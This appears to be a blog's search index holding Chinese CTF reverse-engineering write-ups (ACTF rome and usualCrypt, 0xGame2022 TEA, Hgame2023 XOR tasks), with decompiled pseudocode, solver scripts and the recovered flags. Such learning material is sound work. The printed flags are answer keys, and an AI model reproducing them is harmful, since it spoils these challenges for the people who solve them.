<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACTF新生赛2020-rome</title>
    <url>/2023/01/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-rome/</url>
    <content><![CDATA[<h1 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  strcpy(v12, &quot;Qsw3sj_lz4_Ujw@l&quot;);</span><br><span class="line">  printf(&quot;Please input:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;flag);</span><br><span class="line">  result = flag;</span><br><span class="line">  if ( flag == &#x27;A&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    if ( v3 == &#x27;C&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      if ( v4 == &#x27;T&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        if ( v5 == &#x27;F&#x27; )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          if ( v6 == &#x27;&#123;&#x27; )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            if ( v11 == &#x27;&#125;&#x27; )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[0] = v7;</span><br><span class="line">              v1[1] = v8;</span><br><span class="line">              v1[2] = v9;</span><br><span class="line">              v1[3] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[17] = 0;</span><br><span class="line">              while ( *(int *)&amp;v12[17] &lt;= 15 )</span><br><span class="line">              &#123;</span><br><span class="line">                if ( *((char *)v1 + *(_DWORD *)&amp;v12[17]) &gt; 64 &amp;&amp; *((char *)v1 + *(_DWORD *)&amp;v12[17]) &lt;= 90 )// 大写字母</span><br><span class="line">                              </span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[17]) = (*((char *)v1 + *(_DWORD *)&amp;v12[17]) - 51) % 26 + 65;</span><br><span class="line">                if ( *((char *)v1 + *(_DWORD *)&amp;v12[17]) &gt; 96 &amp;&amp; *((char *)v1 + *(_DWORD *)&amp;v12[17]) &lt;= 122 )// 小写字母</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[17]) = (*((char *)v1 + *(_DWORD *)&amp;v12[17]) - 79) % 26 + 97;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[17];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[17] = 0;</span><br><span class="line">              while ( *(int *)&amp;v12[17] &lt;= 15 )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (unsigned __int8)v12[*(_DWORD *)&amp;v12[17]];</span><br><span class="line">                if ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[17]) != (_BYTE)result )</span><br><span class="line">                  return result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[17];</span><br><span class="line">              &#125;</span><br><span class="line">              return printf(&quot;You are correct!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显是一个变异凯撒，小写字母移动14位，大写字母移动18位</p>
<p>对凯撒的详细介绍可参考：<a href="https://an0rak-code.github.io/2023/01/04/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/">https://an0rak-code.github.io/2023/01/04/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/</a></p>
<h4 id="两种方法："><a href="#两种方法：" class="headerlink" title="两种方法："></a>两种方法：</h4><h5 id="暴力求解"><a href="#暴力求解" class="headerlink" title="暴力求解"></a>暴力求解</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">v12 = <span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        k = j</span><br><span class="line">        <span class="keyword">if</span> j &gt; <span class="number">64</span> <span class="keyword">and</span> j &lt;= <span class="number">90</span>:</span><br><span class="line">            j = (j - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> j &gt; <span class="number">96</span> <span class="keyword">and</span> j &lt;= <span class="number">122</span>:</span><br><span class="line">            j = (j - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> j == <span class="built_in">ord</span>(v12[i]):</span><br><span class="line">            flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h5 id="直接解密"><a href="#直接解密" class="headerlink" title="直接解密"></a>直接解密</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase   <span class="comment">#返回所有小写字母</span></span><br><span class="line">s2=string.ascii_uppercase   <span class="comment">#返回所有大写字母</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">password =[<span class="number">81</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">51</span>,<span class="number">115</span>,<span class="number">106</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">122</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">64</span>,<span class="number">108</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= <span class="built_in">chr</span>(p) &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        flag+=s1[p-<span class="number">18</span>-<span class="number">97</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= <span class="built_in">chr</span>(p) &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        flag+=s2[p-<span class="number">14</span>-<span class="number">65</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(p)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - <span class="number">18</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - <span class="number">14</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(p, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu做题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>0xGame2022复现</title>
    <url>/2023/01/07/0xGame2022%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><p>一个普通的tea加密，提取密钥密文进行解密即可</p>
<img src="/2023/01/07/0xGame2022%E5%A4%8D%E7%8E%B0/image-20230107123837017.png" class title="This is an image">

<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i; <span class="comment">/* set up */</span></span><br><span class="line"><span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>; <span class="comment">/* a key schedule constant */</span></span><br><span class="line"><span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">&#125; <span class="comment">/* end cycle */</span></span><br><span class="line">v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0x9e3779b9</span> * <span class="number">32</span>, i; <span class="comment">/* set up */</span></span><br><span class="line"><span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>; <span class="comment">/* a key schedule constant */</span></span><br><span class="line"><span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125; <span class="comment">/* end cycle */</span></span><br><span class="line">v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">6</span>] = &#123;<span class="number">0x795F6F64</span>, <span class="number">0x6B5F756F</span>, <span class="number">0x5F776F6E</span>, <span class="number">0x3F616574</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> enc[] =&#123;<span class="number">3293258237</span>, <span class="number">3797453781</span>, <span class="number">2711996313</span>, <span class="number">3260442805</span>, <span class="number">1056803237</span>,</span><br><span class="line"><span class="number">1218477302</span>, <span class="number">896926073</span>, <span class="number">1670822367</span>, <span class="number">2779477777</span>, <span class="number">2262174553</span>, <span class="number">226803321</span>,</span><br><span class="line"><span class="number">4259941008</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">12</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">decrypt(enc + i,(<span class="type">uint32_t</span> *)key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="type">char</span> *)(enc));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//官方exp</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py脚本1</span></span><br><span class="line"><span class="comment">#tea4</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k, i</span>):</span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">2</span> * i]), c_uint32(v[<span class="number">2</span> * i + <span class="number">1</span>])</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    k0, k1, k2, k3 = k[<span class="number">0</span>], k[<span class="number">1</span>], k[<span class="number">2</span>], k[<span class="number">3</span>]</span><br><span class="line">    total = c_uint32((-delta) * <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        total.value += delta</span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line">value =[<span class="number">0xC44B21FD</span>,<span class="number">0xE2588BD5</span>,<span class="number">0xA1A5C799</span>,<span class="number">0xC25668B5</span>,<span class="number">0x3EFD89A5</span>,<span class="number">0x48A07CF6</span>,<span class="number">0x35760179</span>,<span class="number">0x6396B9DF</span>,<span class="number">0xA5AB7711</span>,<span class="number">0x86D60B59</span>,<span class="number">0xD84BE79</span>,<span class="number">0xFDE98A90</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x795F6F64</span>,<span class="number">0x6B5F756F</span>,<span class="number">0x5F776F6E</span>,<span class="number">0x3F616574</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    res = decrypt(value, key, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(res[<span class="number">0</span>]), <span class="built_in">hex</span>(res[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span> = <span class="string">&#x27;307847616d657b63396663393865392d33623732662d396463332d3030613934643862313236647d&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = binascii.unhexlify(<span class="built_in">hex</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#0xGame&#123;c9fc98e9-3b72f-9dc3-00a94d8b126d&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py脚本2</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v,k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    sum1 = c_uint32((-delta) * <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= (sum1.value + v0.value) ^ (k[<span class="number">2</span>] + (v0.value &lt;&lt; <span class="number">4</span>)) ^ (k[<span class="number">3</span>] + (v0.value &gt;&gt; <span class="number">5</span>))</span><br><span class="line">        v0.value -= (sum1.value + v1.value) ^ (k[<span class="number">0</span>] + (v1.value &lt;&lt; <span class="number">4</span>)) ^ (k[<span class="number">1</span>] + (v1.value &gt;&gt; <span class="number">5</span>))</span><br><span class="line">        sum1.value += delta</span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag=<span class="string">b&quot;&quot;</span></span><br><span class="line">    l=[<span class="number">0xC44B21FD</span>,<span class="number">0xE2588BD5</span>,<span class="number">0xA1A5C799</span>,<span class="number">0xC25668B5</span>,<span class="number">0x3EFD89A5</span>,<span class="number">0x48A07CF6</span>,<span class="number">0x35760179</span>,<span class="number">0x6396B9DF</span>,<span class="number">0xA5AB7711</span>,<span class="number">0x86D60B59</span>,<span class="number">0xD84BE79</span>,<span class="number">0xFDE98A90</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">12</span>,<span class="number">2</span>):</span><br><span class="line">        a = [l[i],l[i+<span class="number">1</span>]]</span><br><span class="line">        k = [<span class="number">0x795F6F64</span>,<span class="number">0x6B5F756F</span>,<span class="number">0x5F776F6E</span>,<span class="number">0x3F616574</span>]</span><br><span class="line">        res = decrypt(a,k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        flag += libnum.n2s(res[<span class="number">0</span>])[::-<span class="number">1</span>]</span><br><span class="line">        flag += libnum.n2s(res[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF新生赛2020-usualCrypt</title>
    <url>/2023/01/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/</url>
    <content><![CDATA[<h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><p>有个明显的base64表，交叉引用，会发现使用多次</p>
<img src="/2023/01/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230104160550446.png" class title="This is an image">

<p>一个个跟进去会发现函数sub_401000对码表进行了变表处理</p>
<img src="/2023/01/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230104160845152.png" class title="This is an image">

<p>跟进函数sub_401030，发现进行了一个大小写转换</p>
<img src="/2023/01/04/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/image-20230104161054534.png" class title="This is an image">

<p>所以我们只要先对密文进行大小写转换，用变表base64解密就能拿到flag</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">65</span>&lt;=<span class="built_in">ord</span>(a[i]) <span class="keyword">and</span> <span class="built_in">ord</span>(a[i])&lt;=<span class="number">90</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])+<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">97</span>&lt;=<span class="built_in">ord</span>(a[i]) <span class="keyword">and</span> <span class="built_in">ord</span>(a[i])&lt;=<span class="number">122</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])-<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=a[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9&quot;</span>   <span class="comment">#str1是要解密的代码</span></span><br><span class="line">string1 = <span class="string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>   <span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#flag&#123;bAse64_h2s_a_Surprise&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">Str = <span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)</span><br><span class="line">model = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">15</span>):</span><br><span class="line">    Str[i],Str[i+<span class="number">10</span>] = Str[i+<span class="number">10</span>],Str[i]</span><br><span class="line">Str = <span class="string">&#x27;&#x27;</span>.join(Str)</span><br><span class="line">enc = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span>.swapcase()</span><br><span class="line">dec = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    dec += model[Str.find(enc[i])]</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line"><span class="built_in">print</span>(Str)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(dec))</span><br><span class="line"><span class="comment">#网上的脚本，更明了</span></span><br><span class="line"><span class="comment">#Python swapcase() 方法用于对字符串的大小写字母进行转换，即将大写字母转换为小写字母，小写字母会转换为大写字母。</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu做题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame2023复现</title>
    <url>/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>新年前，把前面的欠的债还一还，哈哈哈。。</p>
<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h2><img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230121195537303.png" class title="This is an image">

<p>其实就是一个普通的异或处理，但苦于脚本能力并不好，感觉写的exp有点傻，因为要注意一个小端存储的问题，但在c语言中就不用管这么多，可以直接全文复制，不用管int怎么转char</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v5=[<span class="number">0x04</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0x09</span>,<span class="number">0x01</span>,<span class="number">0xf3</span>,<span class="number">0xb0</span>,<span class="number">0x0</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0x07</span>,<span class="number">0x06</span>,<span class="number">0x17</span>,<span class="number">0x05</span>,<span class="number">0xeb</span>,<span class="number">0x17</span>,<span class="number">0xfd</span>,<span class="number">0x17</span>,<span class="number">0xea</span>,<span class="number">0x01</span>,<span class="number">0xee</span>,<span class="number">0x01</span>,<span class="number">0xea</span>,<span class="number">0xb1</span>,<span class="number">0x05</span>,<span class="number">0xfa</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,<span class="number">0x17</span>,<span class="number">0xac</span>,<span class="number">0xec</span>,<span class="number">0x01</span>,<span class="number">0xea</span>,</span><br><span class="line">    <span class="number">0xfd</span>,<span class="number">0xf0</span>,<span class="number">0x05</span>,<span class="number">0x07</span>,<span class="number">0x06</span>,-<span class="number">7</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(v5))</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">41</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v5)):</span><br><span class="line">    flag[i]=(v5[i]+<span class="number">86</span>)^<span class="number">0x32</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="built_in">hex</span>=<span class="string">&#x27;6867616d657b3464646974316f6e5f69735f615f72657665723569626c655f307065726174696f6e7d&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>))</span><br></pre></td></tr></table></figure>

<p>官方放出的wp用的是c语言，很方便</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	 <span class="type">int</span> v8[<span class="number">11</span>];</span><br><span class="line">	 v8[<span class="number">0</span>] = <span class="number">167640836</span>;</span><br><span class="line">	 v8[<span class="number">1</span>] = <span class="number">11596545</span>;</span><br><span class="line">	 v8[<span class="number">2</span>] = <span class="number">-1376779008</span>;</span><br><span class="line">	 v8[<span class="number">3</span>] = <span class="number">85394951</span>;</span><br><span class="line">	 v8[<span class="number">4</span>] = <span class="number">402462699</span>;</span><br><span class="line">	 v8[<span class="number">5</span>] = <span class="number">32375274</span>;</span><br><span class="line">	 v8[<span class="number">6</span>] = <span class="number">-100290070</span>;</span><br><span class="line">	 v8[<span class="number">7</span>] = <span class="number">-1407778552</span>;</span><br><span class="line">	 v8[<span class="number">8</span>] = <span class="number">-34995732</span>;</span><br><span class="line">	 v8[<span class="number">9</span>] = <span class="number">101123568</span>;</span><br><span class="line">	 v8[<span class="number">10</span>] = <span class="number">-7</span>;</span><br><span class="line">	 <span class="type">char</span>* p = v8;</span><br><span class="line">	 <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">41</span>; i++)</span><br><span class="line">		 &#123;</span><br><span class="line">		 <span class="built_in">putchar</span>((p[i] + <span class="number">86</span>) ^ <span class="number">0x32</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="comment">//hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230121201602252.png" class title="This is an image">

<p>但逻辑其实不难，就是做了一个处理，然后对数据进行一个比较，但是对数据的处理部分可能一开始看会比较的迷..可以运行几个数尝试下，看看实现了什么功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;hgame&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>])&amp;<span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>((<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>])&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>)</span><br></pre></td></tr></table></figure>

<p>从结果来看，把一个8bit的char用位运算拆为两个4bit的数字，然后开始比较，这里比较麻烦的应该是数据的提取，双击进去dword_403000，然后按y设置成int数组，再shift+E导出数据</p>
